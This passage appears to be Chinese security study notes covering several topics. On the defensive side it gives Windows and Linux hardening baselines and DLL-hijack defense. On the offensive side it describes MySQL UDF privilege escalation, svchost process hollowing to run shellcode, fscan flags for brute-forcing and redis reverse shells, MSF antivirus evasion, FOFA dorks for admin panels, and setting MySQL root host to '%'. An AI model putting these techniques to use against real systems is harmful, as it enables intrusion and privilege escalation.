<p>（1）攻击者编写一些可以调用cmd或者shell的共享库文件（window为.dll，linux为.so），将共享库导入指定的函数目录中。</p>
<p>（2）在MySQL中创建指向共享库文件的自定义函数。</p>
<p>（3）通过刚刚创建的函数执行系统命令，实现提权。<br>条件</p>
<p>1.要<strong>有一个高权限的MySQL的账号</strong>，具有增删改查的权限以创建自定义函数，最好是root账号。</p>
<p> 2.<strong>MySQL的权限配置secure_file_priv为空</strong>，此时load_data,into outfile,load_flie()都没有目录的限制，可以使用如下命令查看secure_file_priv参数的值：</p>
<p>3.<strong>必须有创建函数的目录</strong>，这个目录与MySQL的版本有关，对于MySQL&gt;&#x3D;5.1的版本，创建函数的目录是plugin，可以用如下的命令查看：</p>
<p>show variables like ‘%plugin%’;</p>
<h2 id="windows基线"><a href="#windows基线" class="headerlink" title="windows基线"></a>windows基线</h2><p>主要包括五个方面：身份鉴别、访问控制、安全审计、资源控制、剩余信息保护</p>
<ul>
<li><strong>身份鉴别</strong></li>
<li>更改缺省账户</li>
<li>检查Guest用户是否禁用</li>
<li>密码复杂性要求</li>
<li>密码长度最小不能小于8位</li>
<li><strong>访问控制</strong></li>
<li>共享账户检查</li>
<li>远程关机授权</li>
<li>本地关机</li>
<li>授权帐户登陆</li>
<li><strong>安全审计</strong></li>
<li>用户登录日志记录</li>
<li>系统日志完备性检</li>
<li>登录超时管理</li>
<li><strong>资源控制</strong></li>
<li>登录超时管理</li>
<li>远程登录超时配置</li>
<li><strong>剩余信息保护</strong></li>
<li>不显示上次的用户名</li>
<li>关机前清除虚拟内存页面</li>
<li>不启用可还原的加密来存储密码</li>
</ul>
<h2 id="linux基线"><a href="#linux基线" class="headerlink" title="linux基线"></a>linux基线</h2><p>每个公司有每个公司的基线规范体系，但是答题分为下列五个方面</p>
<ul>
<li><strong>账号管理和授权</strong></li>
<li>检查特殊账号，是否存在空密码的账户和 root 权限账户</li>
<li>禁用或删除无用账号</li>
<li>添加口令策略:&#x2F;etc&#x2F;login.defs修改配置文件，设置过期时间、连续认证失败次数</li>
<li>禁止 root 远程登录，限制root用户直接登录。</li>
<li>检查 su 权限:vi &#x2F;etc&#x2F;pam.d&#x2F;su添加auth required pam_wheel.so group&#x3D;test</li>
<li><strong>服务</strong></li>
<li>关闭不必要的服务</li>
<li>SSH 服务安全</li>
<li>不允许 root 账号直接登录系统，PermitRootLogin&#x3D;no</li>
<li>修改 SSH 使用的协议版本为 2</li>
<li>修改允许密码错误次数（默认 6 次），MaxAuthTries&#x3D;3</li>
<li><strong>文件系统</strong></li>
<li>设置 umask 值 vi &#x2F;etc&#x2F;profile 添加行 umask 027</li>
<li>设置登录超时 vi &#x2F;etc&#x2F;profile 修改配置文件，将以 TMOUT&#x3D; 开头的行注释，设置为 TMOUT&#x3D;180</li>
<li><strong>日志</strong></li>
<li>启用 syslogd 日志，配置日志目录权限，或者设置日志服务器</li>
<li>记录所有用户的登录和操作日志，通过脚本代码实现记录所有用户的登录操作日志，防止出现安全事件后无据可查</li>
</ul>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.alibabacloud.com/help/zh/faq-detail/49809.htm</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>IP 协议安全要求</strong></li>
<li>远程登录取消 telnet 采用 ssh</li>
<li>设置 &#x2F;etc&#x2F;hosts.allow 和 deny</li>
<li>禁止 ICMP 重定向</li>
<li>禁止源路由转发</li>
<li>防 ssh 破解，iptables (对已经建立的所有链接都放行，限制每分钟连接 ssh 的次数)+ denyhost (添加 ip 拒绝访问)</li>
</ul>
<h2 id="docker操作"><a href="#docker操作" class="headerlink" title="docker操作"></a>docker操作</h2><p>查看镜像——docker images </p>
<p>查看所有状态容器——docker ps -a</p>
<p>docker —— run 指令</p>
<p>下载镜像——docker pull</p>
<p>搜索镜像（公共仓库）——docker search</p>
<p>查询所有容器运行状态——docker ps -a</p>
<p>创建容器——docker create</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># -d设置后台运行 8181为访问端口ip 8080项目中设置的端口ip</span><br><span class="line">docker run -it -d --name test01 -p 8181:8877 -v /xxx:/xxx:rslave  test-go-1:latest</span><br><span class="line">参数说明</span><br><span class="line">-p				  # 主机端口:容器端口</span><br><span class="line">-it				  # 后台交互式运行</span><br><span class="line">-d                # 后台方式运行</span><br><span class="line">--name            # 取容器别名，例如test01</span><br><span class="line">--restart=always  # 开机自启</span><br><span class="line">-v /xxx:/xxx:rslave		# 文件夹映射:容器文件夹:模式的命令</span><br><span class="line">test-go-1:latest  # 构建的镜像的名字</span><br></pre></td></tr></table></figure>

<p> 启动容器——docker start</p>
<p>启动容器（一次性执行）—— docker run加 -d 选项让 Docker 容器以守护形式在后台运行。并且容器所运行的程序不能结束。</p>
<p>查看日志docker logs -f 容器id</p>
<h2 id="fscan操作"><a href="#fscan操作" class="headerlink" title="fscan操作"></a>fscan操作</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">-c string</span><br><span class="line">      ssh命令执行</span><br><span class="line">-cookie string</span><br><span class="line">      设置cookie</span><br><span class="line">-debug int</span><br><span class="line">      多久没响应,就打印当前进度(default 60)</span><br><span class="line">-domain string</span><br><span class="line">      smb爆破模块时,设置域名</span><br><span class="line">-h string</span><br><span class="line">      目标ip: 192.168.11.11 | 192.168.11.11-255 | 192.168.11.11,192.168.11.12</span><br><span class="line">-hf string</span><br><span class="line">      读取文件中的目标</span><br><span class="line">-hn string</span><br><span class="line">      扫描时,要跳过的ip: -hn 192.168.1.1/24</span><br><span class="line">-m string</span><br><span class="line">      设置扫描模式: -m ssh (default &quot;all&quot;)</span><br><span class="line">-no</span><br><span class="line">      扫描结果不保存到文件中</span><br><span class="line">-nobr</span><br><span class="line">      跳过sql、ftp、ssh等的密码爆破</span><br><span class="line">-nopoc</span><br><span class="line">      跳过web poc扫描</span><br><span class="line">-np</span><br><span class="line">      跳过存活探测</span><br><span class="line">-num int</span><br><span class="line">      web poc 发包速率  (default 20)</span><br><span class="line">-o string</span><br><span class="line">      扫描结果保存到哪 (default &quot;result.txt&quot;)</span><br><span class="line">-p string</span><br><span class="line">      设置扫描的端口: 22 | 1-65535 | 22,80,3306 (default &quot;21,22,80,81,135,139,443,445,1433,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017&quot;)</span><br><span class="line">-pa string</span><br><span class="line">      新增需要扫描的端口,-pa 3389 (会在原有端口列表基础上,新增该端口)</span><br><span class="line">-path string</span><br><span class="line">      fcgi、smb romote file path</span><br><span class="line">-ping</span><br><span class="line">      使用ping代替icmp进行存活探测</span><br><span class="line">-pn string</span><br><span class="line">      扫描时要跳过的端口,as: -pn 445</span><br><span class="line">-pocname string</span><br><span class="line">      指定web poc的模糊名字, -pocname weblogic</span><br><span class="line">-proxy string</span><br><span class="line">      设置代理, -proxy http://127.0.0.1:8080</span><br><span class="line">-user string</span><br><span class="line">      指定爆破时的用户名</span><br><span class="line">-userf string</span><br><span class="line">      指定爆破时的用户名文件</span><br><span class="line">-pwd string</span><br><span class="line">      指定爆破时的密码</span><br><span class="line">-pwdf string</span><br><span class="line">      指定爆破时的密码文件</span><br><span class="line">-rf string</span><br><span class="line">      指定redis写公钥用模块的文件 (as: -rf id_rsa.pub)</span><br><span class="line">-rs string</span><br><span class="line">      redis计划任务反弹shell的ip端口 (as: -rs 192.168.1.1:6666)</span><br><span class="line">-silent</span><br><span class="line">      静默扫描,适合cs扫描时不回显</span><br><span class="line">-sshkey string</span><br><span class="line">      ssh连接时,指定ssh私钥</span><br><span class="line">-t int</span><br><span class="line">      扫描线程 (default 600)</span><br><span class="line">-time int</span><br><span class="line">      端口扫描超时时间 (default 3)</span><br><span class="line">-u string</span><br><span class="line">      指定Url扫描</span><br><span class="line">-uf string</span><br><span class="line">      指定Url文件扫描</span><br><span class="line">-wt int</span><br><span class="line">      web访问超时时间 (default 5)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="tcp-udp区别"><a href="#tcp-udp区别" class="headerlink" title="tcp udp区别"></a>tcp udp区别</h2><p><img src="/photo/1605056951790214.png" alt="3a819be58c17309e0cd5ac309290d7f.png"></p>
<h2 id="内网数据库连接"><a href="#内网数据库连接" class="headerlink" title="内网数据库连接"></a>内网数据库连接</h2><p>开启访问权限<br>登录mysql命令</p>
<p>mysql -u root -p<br>切换到名为 “mysql” 的数据库</p>
<p>use mysql<br>查看 “user” 表中的 “user” 和 “host” 列的数据</p>
<p>select user, host from user;<br>输入命令更改root用户访问权限，host值改为%就代表在任何客户端机器上能以root用户登录mysql服务器；</p>
<p>update user set host&#x3D;’%’ where user&#x3D;’root’;<br>更新设定，运行命令</p>
<p>flush privileges;</p>
<p>工具可以通过navicat</p>
<p><strong>1. 打开 Navicat 并创建连接</strong></p>
<ul>
<li>打开 Navicat 并单击“新建连接”。</li>
<li>在“新建连接”对话框中，选择要连接的数据库类型，例如 MySQL、PostgreSQL 或 Oracle。</li>
</ul>
<p><strong>2. 输入连接详细信息</strong></p>
<ul>
<li>输入连接详细信息，包括：<ul>
<li>主机名或 IP 地址</li>
<li>端口号</li>
<li>用户名</li>
<li>密码</li>
<li>数据库名称（可选）</li>
</ul>
</li>
</ul>
<p><strong>3. 调整高级设置（可选）</strong></p>
<ul>
<li>单击“高级”选项卡，可以配置其他连接设置，例如：<ul>
<li>字符集</li>
<li>时间格式</li>
<li>SSL 加密</li>
</ul>
</li>
</ul>
<p><strong>4. 保存连接（可选）</strong></p>
<ul>
<li>单击“保存”按钮将连接保存为数据库列表中的配置文件。</li>
</ul>
<p><strong>5. 测试连接</strong></p>
<ul>
<li>单击“测试连接”按钮以验证连接配置是否正确。</li>
</ul>
<p><strong>6. 连接到数据库</strong></p>
<ul>
<li>如果测试成功，单击“确定”按钮连接到数据库。</li>
</ul>
<p><strong>7. 查看数据库对象</strong></p>
<ul>
<li>连接成功后，您可以在 Navicat 中查看数据库中的对象，例如表、视图、存储过程等。</li>
</ul>
<h2 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h2><h4 id="负载均衡的原理"><a href="#负载均衡的原理" class="headerlink" title="负载均衡的原理"></a>负载均衡的原理</h4><p>系统的扩展可分为纵向（垂直）扩展和横向（水平）扩展。</p>
<p>纵向扩展，是从单机的角度通过增加硬件处理能力，比如CPU处理能力，内存容量，磁盘等方面，实现服务器处理能力的提升，不能满足大型分布式系统（网站），大流量，高并发，海量数据的问题。</p>
<p>因此需要采用横向扩展的方式，通过添加机器来满足大型网站服务的处理能力。比如：一台机器不能满足，则增加两台或者多台机器，共同承担访问压力。这就是典型的集群和负载均衡架构：如下图：</p>
<p>应用集群：将同一应用部署到多台机器上，组成处理集群，接收负载均衡设备分发的请求，进行处理，并返回相应数据。<br>负载均衡设备：将用户访问的请求，根据负载均衡算法，分发到集群中的一台处理服务器。（一种把网络请求分散到一个服务器集群中的可用服务器上去的设备）</p>
<h4 id="负载均衡的作用"><a href="#负载均衡的作用" class="headerlink" title="负载均衡的作用"></a>负载均衡的作用</h4><p>1.解决并发压力，提高应用处理性能（增加吞吐量，加强网络处理能力）；</p>
<p>2.提供故障转移，实现高可用；</p>
<p>3.通过添加或减少服务器数量，提供网站伸缩性（扩展性）；</p>
<p>4.安全防护；（负载均衡设备上做一些过滤，黑白名单等处理）</p>
<h4 id="负载均衡的分类"><a href="#负载均衡的分类" class="headerlink" title="负载均衡的分类"></a>负载均衡的分类</h4><p>1）二层负载均衡（mac）</p>
<p>根据OSI模型分的二层负载，一般是用虚拟mac地址方式，外部对虚拟MAC地址请求，负载均衡接收后分配后端实际的MAC地址响应）</p>
<p>2）三层负载均衡（ip）</p>
<p>一般采用虚拟IP地址方式，外部对虚拟的ip地址请求，负载均衡接收后分配后端实际的IP地址响应）</p>
<p>3）四层负载均衡（tcp）</p>
<p>在三次负载均衡的基础上，用ip+port接收请求，再转发到对应的机器。</p>
<p>4）七层负载均衡（http）</p>
<p>根据虚拟的url或IP，主机名接收请求，再转向相应的处理服务器。</p>
<p><strong>最常见的四层和七层负载均衡</strong><br>1）四层的负载均衡就是基于IP+端口的负载均衡：在三层负载均衡的基础上，通过发布三层的IP地址（VIP），然后加四层的端口号，来决定哪些流量需要做负载均衡。</p>
<p>对应的负载均衡器称为四层交换机（L4 switch），主要分析IP层及TCP&#x2F;UDP层，实现四层负载均衡。此种负载均衡器不理解应用协议（如HTTP&#x2F;FTP&#x2F;MySQL等等）。</p>
<p><strong>实现四层负载均衡的软件有：</strong></p>
<p>F5：硬件负载均衡器，功能很好，但是成本很高。<br>lvs：重量级的四层负载软件<br>nginx：轻量级的四层负载软件，带缓存功能，正则表达式较灵活<br>haproxy：模拟四层转发，较灵活<br>2）七层的负载均衡就是基于虚拟的URL或主机IP的负载均衡</p>
<p>对应的负载均衡器称为七层交换机（L7 switch），除了支持四层负载均衡以外，还有分析应用层的信息，如HTTP协议URI或Cookie信息，实现七层负载均衡。此种负载均衡器能理解应用协议。</p>
<p><strong>实现七层负载均衡的软件有：</strong></p>
<p>haproxy：天生负载均衡技能，全面支持七层代理，会话保持，标记，路径转移；<br>nginx：只在http协议和mail协议上功能比较好，性能与haproxy差不多；<br>apache：功能较差<br>Mysql proxy：功能尚可。<br>总的来说，一般是lvs做4层负载；nginx做7层负载；haproxy比较灵活，4层和7层负载均衡都能做。</p>
<h2 id="云函数"><a href="#云函数" class="headerlink" title="云函数"></a>云函数</h2><p><strong>云函数(Serverless Cloud Function，SCF)<strong>的简单理解就是：可以</strong>部署在云上</strong>的项目，但<strong>不需要特地购买服务器</strong>，并且可以通过“定时&#x2F;url访问”等<strong>特定方式触发</strong>运行。<strong>这特别适合于既需要云环境，但又不需要为此大成本购买服务器的用户。</strong><br>比如，我只是希望能定时运行一个检查专利状态、自动签到的脚本，也可能是想要运行一个flask API网管，甚至你也可以用它来做自制软件的网络验证。</p>
<h2 id="隐藏ip"><a href="#隐藏ip" class="headerlink" title="隐藏ip"></a>隐藏ip</h2><p>vpn，虚拟机挂代理，用肉鸡隐藏ip</p>
<h2 id="svchost反弹shell"><a href="#svchost反弹shell" class="headerlink" title="svchost反弹shell"></a>svchost反弹shell</h2><p>首先，使用 CreateProcess 函数创建svchost.exe进程，并且设置创建进程的标志为 CREATE_SUSPENDED，即表示新进程的主线程被挂起。<br>使用 GetThreadContext，设置标志为 CONTEXT_ALL，获取新进程中所有的线程上下文。<br>使用 ReadProcessMemory 读取目标进程的加载基址。<br>在原来的空间中进行覆盖写入 Shellcode。<br>最后，调用 ResumeThread 恢复主线程，让进程继续运行并执行我们的 Shellcode 代码。</p>
<p>应急应该就是dll劫持的应急</p>
<p>通用免疫方案： [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs]在此注册表项下定义一个“已知DLL名称”，那么凡是此项下的DLL文件就会被禁止从EXE自身目录下调用，而只能从系统目录，也就是system32目录下调用。据此可以写一个简单的DLL劫持免疫器 或者可以在加载dll是检测MD5和大小,来防御.</p>
<h2 id="误报处理"><a href="#误报处理" class="headerlink" title="误报处理"></a>误报处理</h2><p>包含有<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=SQL%E8%AF%AD%E5%8F%A5&spm=1001.2101.3001.7020">SQL语句</a>和一些危险函数都有可能产生误报</p>
<p>来自外网的误报说明安全设备需要进行策略升级，不需要处置。</p>
<p>如果是来自内网的误报可以和负责人协商一下看能不能解决，有必要的话添加白名单处理。</p>
<h2 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h2><p>Metasploit Framework(MSF)是一款开源安全漏洞检测工具，附带数千个已知的软件漏洞，并保持持续更新。Metasploit可以用来信息收集、漏洞探测、漏洞利用等渗透测试的全流程。</p>
<p>模块：</p>
<p>Auxiliary（辅助模块）</p>
<p>为渗透测试信息搜集提供了大量的辅助模块支持</p>
<p>Exploits（攻击模块）</p>
<p>利用发现的安全漏洞或配置弱点对远程目标系统 进行攻击，从而获得对远程目标系统访问权的代码组件。</p>
<p>Payload（攻击载荷模块）</p>
<p>攻击成功后促使靶机运行的一段植入代码</p>
<p>Post （后渗透攻击模块）</p>
<p>收集更多信息或进一步访问被利用的目标系统</p>
<p>Encoders（编码模块）</p>
<p>将攻击载荷进行编码，来绕过防护软件拦截</p>
<p>使用：</p>
<p>首先利用Auxiliary辅助探测模块扫描，嗅探，指纹识别相关漏洞，然后确认漏洞存在使用Exploit漏洞利用模块对漏洞进行利用，包括设置payload攻击载荷，设置本机监听等等。漏洞利用成功目标主机就会通过设置的端口主动连接，产生会话。进而可以进行后渗透。</p>
<p>功能：</p>
<p>木马免杀，抓取用户密码，关闭杀毒软件，屏幕截图，新建账号，远程登录，迁移进程，提权操作，网络嗅探，端口转发 ，内网代理，内网扫描，生成后门，清除日志等等。</p>
<h2 id="外围打点"><a href="#外围打点" class="headerlink" title="外围打点"></a>外围打点</h2><p>常见工具</p>
<p><img src="/photo/format,png.png" alt="img"></p>
<p>过程：</p>
<p>五个步骤，分别是靶标确认、信息收集、漏洞探测、利用漏洞和获取权限，最终要得到的是获取靶标的系统权限进而获得关键数据。</p>
<h2 id="内网穿透工具原理"><a href="#内网穿透工具原理" class="headerlink" title="内网穿透工具原理"></a>内网穿透工具原理</h2><h4 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h4><p>内网穿透，又叫NAT（Network Address Translation）穿透。对于在NAT之后的节点来说，其不是不能主动访问公网端口，而是不能反过来有效的被公网访问。内网穿透的主要思路就是利用这一点，让在NAT之后的节点主动访问一个拥有公网IP地址的服务器，并由中间服务器搭桥，打通经过该服务器从其他主机到NAT之后节点的隧道。</p>
<p>同样该技术除了可以访问隐藏在NAT之后的节点，同样可以穿透防火墙。由于防火墙只拦截了入站没有拦截出站，所以可以让防火墙内的服务器主动连接到一个公网服务器打通隧道，并通过该隧道最终链接到本地的其他端口。</p>
<p><strong>Step 1：打通隧道</strong><br>出于安全起见，除非是主机主动向对方发出了连接请求（这时会在该主机的数据结构中留下一条记录），否则，当主机接收到数据包时，如果在其数据结构中查询不到对应的记录，那些不请自来的数据包将会被丢弃。因此，位于不同局域网内的两台主机，即使是知道了对方的 IP 地址和端口号，“一厢情愿”地将数据包发送过去，对方也是接收不到的，所以我们首先需要打通隧道。</p>
<p>假设公网IP为X.X.X.X，内网IP为192.168.1.2。公网主机先监听80端口，监听这个端口是用于向外部提供一个HTTP服务，80是WEB服务器的默认端口。同时其他任意一个端口（这里我们假设为7777），监听这个端口是用于让内网服务器主动连接进来打通一个隧道。接着内网再主动向公网主机的7777发起一个请求，这样内网就成功与公网主机建立了一个连接通道。然后当有任何客户端主动连接公网的80端口时，公网接收到连接请求之后马上把这连接请求通过先前建立好的隧道转发到内网主机。<br><strong>Step 2：端口转发（公网主机80端口 转发至 内网80端口）</strong><br>当有任何客户端主动连接公网的80端口时，公网接收到连接请求之后马上把这连接请求通过先前建立好的隧道转发到内网主机，内网主机接收到来自隧道的数据包后再主动连接内网主机自身的80端口，连接成功之后将数据包原封不动地转发数据包给80端口。<br><strong>Step 3：原路转发响应报文</strong><br>内网主机接收到来自隧道的数据包后再主动连接内网主机自身的80端口，连接成功之后将数据包原封不动地转发数据包给80端口，待HTTP服务器程序处理完这个数据包，生成了响应报文之后再原路转发回去，最终到达公网的80端口，然后返回给最开始请求公网服务器80端口的客户端。</p>
<h4 id="分类-1"><a href="#分类-1" class="headerlink" title="分类"></a>分类</h4><p>类型一:服务器中转穿透<br>根据上述原理搭建的内网穿透环境，数据经过中转公网服务器进行传输，被视为是最为常见的内网穿透种类，市面上大多数内网穿透产品都是采用这种类型实现穿透。</p>
<p>类型二:点对点穿透<br>在内网穿透传输大量数据时如果都经过服务器中转的话，这样会对服务器端带宽压力比较大。</p>
<p>只要是数据量很大，而一般利用中转服务器又需要一定规模投入的应用，我们都可以考虑用P2P技术。<br>（1） UDP打洞技术<br>最为常见的实现P2P的方式是采用UDP打洞技术，UDP打洞技术是通过中间服务器的协助在各自的NAT网关上建立相关的表项，使P2P连接的双方发送的报文能够直接穿透对方的NAT网关，从而实现P2P客户端互连。如果两台位于NAT设备后面的P2P客户端希望在自己的NAT网关上打个洞，那么他们需要一个协助者——集中服务器，并且还需要一种用于打洞的Session建立机制。</p>
<p>Session建立机制：</p>
<p>假定客户端A要发起对客户端B的直接连接，具体的“打洞”过程如下：</p>
<p>（1）A最初不知道如何向客户端B发起连接，于是A向集中服务器（本质上是一台被设置在公网上的服务器，建立P2P的双方都可以直接访问到这台服务器。位于NAT网关后面的客户端A和B都可以与一台已知的集中服务器建立连接，并通过这台集中服务器了解对方的信息并中转各自的信息）发送消息，请求集中服务器帮助建立与客户端B的UDP连接。</p>
<p>（2）集中服务器将含有B的外网和内网的地址二元组发给A，同时，集中服务器将包含有A的外网和内网的地址二元组信息的消息也发给B。这样一来， A与B就都知道对方外网和内网的地址二元组信息了。</p>
<p>（3）当A收到由集中服务器发来的包含B的外网和内网的地址二元组信息后， A开始向B的地址二元组发送UDP数据包，并且A会自动锁定第一个给出响应的B的地址二元组。同理，当B收到由集中服务器发来的A的外网和内网地址二元组信息后，也会开始向A的外网和内网的地址二元组发送UDP数据包，并且自动锁定第一个得到A回应的地址二元组。一旦A与B都向对方的NAT设备在外网上的地址二元组发送了数据包，就打开了A与B之间的“洞”，A与B向对方的外网地址发送数据，等效为向对方的客户端直接发送UDP数据包了。一旦应用程序确认已经可以通过往对方的外网地址发送数据包的方式让数据包到达NAT后面的目的应用程序，程序会自动停止继续发送用于“打洞”的数据包，转而开始真正的P2P数据传输。</p>
<p>当然，UDP转换协议提供的“洞”不是绝对可靠的，多数NAT设备内部都有一个UDP转换的空闲状态计时器，如果在一段时间内没有UDP数据通信，NAT设备会关掉由“打洞”过程打出来的“洞”。如果P2P应用程序希望“洞”的存活时间不受NAT网关的限制，就最好在穿越NAT以后设定一个穿越的有效期。</p>
<p>（2） TCP打洞技术<br>从现在的主流应用的角度上来看，基于TCP的P2P应用显然不如基于UDP的应用那么广泛，但是也存在打洞的需求。</p>
<p>TCP相对于UDP而言要复杂的多，TCP连接的建立要依赖于三次握手的交互，所以NAT网关在处理TCP连接的时候，需要更多的开销。但是，由于TCP协议完备的状态机机制，TCP反而比UDP更能精确的获取某个Session的生命期。</p>
<p>一种新的代理类型 XTCP 能解决这个问题，实现方式可以是采用搭建FRP服务器的方式，在传输数据的两端都部署上 FRP 客户端上用于建立直接的连接</p>
<h4 id="常见工具："><a href="#常见工具：" class="headerlink" title="常见工具："></a>常见工具：</h4><ol>
<li><p>花生壳<br>花生壳既是内网穿透软件、内网映射软件,也是端口映射软件。规模最大，较正规，完善，使用简单但收费高。</p>
</li>
<li><p>Nat123<br>nat123是内网端口映射与动态域名解析（DDNS）软件，在内网启动映射后，可在外网访问连接内网网站等应用。</p>
</li>
<li><p>NATAPP<br>NATAPP基于ngrok的国内内网穿透服务，免费版会强制更换域名。</p>
</li>
<li><p>ngrok<br>ngrok是一个反向代理，通过在公共的端点和本地运行的Web服务器之间建立一个安全的通道。ngrok可捕获和分析所有通道上的流量，便于后期分析与响应。主要用途是给网站或者安装开发提供部署环境，但是也同样可以用来进行端口转发。</p>
</li>
<li><p>Frp 搭建方法<br>相比ngrok，frp内网穿透无需多复杂的配置就可以达到比较好的穿透效果，具有较强的扩展性，支持 tcp, udp, http, https 协议，并且 web 服务支持根据域名进行路由转发。此外，FRP 提供了一种新的代理类型 XTCP ，可以在传输大量数据时让流量不经过服务器中转，用于实现点对点穿透。</p>
</li>
<li><p>FRP实现内网穿透，就在于使用反向代理，使得真实的服务端得以隐藏。当外部用户（client）请求访问服务端VPS的时候，服务端VPS是下图中的客户端（实质上是上图中的server）的反向代理服务器，反向代理服务器会帮我们把请求转发到真实的服务器（下图中的客户端）那里去。这样就实现了内网穿透。</p>
<p><img src="/../../../../pwn/photo/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9kZW5neGouYmxvZy5jc2RuLm5ldA==,size_16,color_FFFFFF,t_70%2523pic_center.png" alt="在这里插入图片描述"></p>
<p>即：<br>Client &#x3D; 外部用户<br>proxy &#x3D; 公网服务器（需要在服务器上搭建FRP服务端）<br>Server &#x3D; 内网服务器（需要在服务器上搭建FRP客户端）</p>
</li>
</ol>
<h2 id="fofa常用"><a href="#fofa常用" class="headerlink" title="fofa常用"></a>fofa常用</h2><p>漏洞方面：body&#x3D;“Index of&#x2F;”（列目录漏洞)</p>
<p>框架：body&#x3D;“icon-spring-boot-admin.svg”(Spring Boot Admin)</p>
<p>子域名：host&#x3D;”<a target="_blank" rel="noopener" href="http://x.cn/">http://x.cn</a>“</p>
<p>后台挖掘：title&#x3D;”后台” &amp;&amp; body&#x3D;“password” &amp;&amp; host&#x3D;”<a target="_blank" rel="noopener" href="http://x.cn/">http://x.cn</a>“</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">2.1在标题中搜索关键字</span><br><span class="line">title=&quot;实验报告系统&quot;</span><br><span class="line">2.2在http头中搜索关键信息</span><br><span class="line">header=&quot;utf-8&quot;</span><br><span class="line">2.3在正文中搜索关键字</span><br><span class="line">body=&quot;登录&quot;</span><br><span class="line">正文中的内容</span><br><span class="line">2.4主机检索</span><br><span class="line">从url中搜索携带关键HOST信息的网站</span><br><span class="line">host=&quot;.gov.cn&quot;</span><br><span class="line">2.5根据根域名检索子域名</span><br><span class="line">domain=&quot;qq.com&quot;</span><br><span class="line">2.6检索开发特定端口的服务器</span><br><span class="line">port=&quot;3306&quot;</span><br><span class="line">2.7搜索特定ip地址的网站信息</span><br><span class="line">2.8检索特定地址网段的目标服务器</span><br><span class="line">ip=&quot;220.181.3.148/24&quot;</span><br><span class="line">2.9服务器查询</span><br><span class="line">server=&quot;服务器&quot;</span><br><span class="line">2.10备案号查询</span><br><span class="line">icp=&quot;备案号&quot;</span><br><span class="line">11.根据服务器状态码查询</span><br><span class="line">status_code=&quot;200&quot;</span><br><span class="line">2.11根据操作系统搜索</span><br><span class="line">os=&quot;windows&quot;</span><br><span class="line">2.12根据设备搜索</span><br><span class="line">app=&quot;Microsoft-Exchange&quot;</span><br><span class="line">2.13筛选不是蜜罐的资产（已默认筛选）</span><br><span class="line">is_honeypot=false</span><br></pre></td></tr></table></figure>




<h2 id="正向shell和反向shell区别"><a href="#正向shell和反向shell区别" class="headerlink" title="正向shell和反向shell区别"></a>正向shell和反向shell区别</h2><ul>
<li><strong>正向Shell</strong>: 在这种模式下，攻击者主动连接到被攻击的机器。这种连接方式可能不稳定，并且容易被防火墙或入侵检测系统拦截。正向shell通常需要攻击者从外部网络主动连接到目标机器，这可能会因为网络防火墙或安全策略的限制而导致连接失败。</li>
<li><strong>反向Shell</strong>: 与正向shell相反，在这种模式下，被攻击的机器主动连接到攻击者的机器。这种连接方式通常不会被防火墙拦截，因为它看起来像是正常的外部连接到内部网络的请求。反向shell允许攻击者通过内部机器的安全通道控制目标机器，即使目标机器位于防火墙后面或受到其他网络隔离措施的保护。</li>
</ul>
<h2 id="连接不了mysql原因"><a href="#连接不了mysql原因" class="headerlink" title="连接不了mysql原因"></a>连接不了mysql原因</h2><ul>
<li>3306端口没有对外开放</li>
